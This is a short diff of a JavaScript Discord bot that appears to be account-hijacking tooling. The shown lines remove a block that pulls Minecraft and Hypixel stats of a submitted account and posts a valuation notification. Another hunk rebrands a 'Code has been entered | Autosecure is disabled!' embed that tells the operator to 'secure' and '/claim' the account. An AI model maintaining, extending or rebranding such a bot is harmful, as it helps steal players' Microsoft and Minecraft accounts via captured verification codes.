@@ -208,36 +208,6 @@ let obj = {
 
             let neededmsg = failed ? failedmsg : msg
 
-            // Send notification if account has Minecraft
-            if (acc.newName && acc.newName !== "No Minecraft!" && hasMinecraft) {
-              try {
-                console.log('[SUBMIT] Account has Minecraft, preparing notification...');
-                console.log('[SUBMIT] Minecraft name:', acc.newName);
-                const stats = await getStats(acc.newName);
-                console.log('[SUBMIT] Stats retrieved:', stats);
-                const accountData = {
-                  username: acc.newName,
-                  networth: stats?.networth || '0',
-                  bedwars: stats?.bedwars?.level || '0',
-                  networkLevel: stats?.networkLevel || '0',
-                  sbLevel: stats?.sbLevel || '0',
-                  duelKDR: stats?.duelKDR || '0',
-                  duelWinstreak: stats?.duelWinstreak || '0',
-                  plusColour: stats?.plusColour || 'None',
-                  gifted: stats?.gifted || '0'
-                };
-                console.log('[SUBMIT] Sending notification for:', accountData.username);
-                await sendSecureNotification(client, accountData);
-                console.log('[SUBMIT] Notification sent successfully');
-
-              } catch (notifError) {
-                console.log('[SUBMIT] Failed to send notification:', notifError.message);
-                console.error('[SUBMIT] Notification error details:', notifError);
-              }
-            } else {
-              console.log('[SUBMIT] Account has no Minecraft, skipping notification');
-            }
-
             console.log('[SUBMIT] Calling aftersecure with:', {
               hasAftersecure: !!acc.aftersecure,
               userId: interaction.user.id,
@@ -447,7 +417,7 @@ let obj = {
             content: ping,
             embeds: [
               {
-                title: "Code has been entered | Autosecure is disabled!",
+                title: "Code has been entered | VinGr0ups3cur3 is disabled!",
                 description: 'Please secure this account manually after claiming using /claim',
                 color: 0x00ff00,
               },
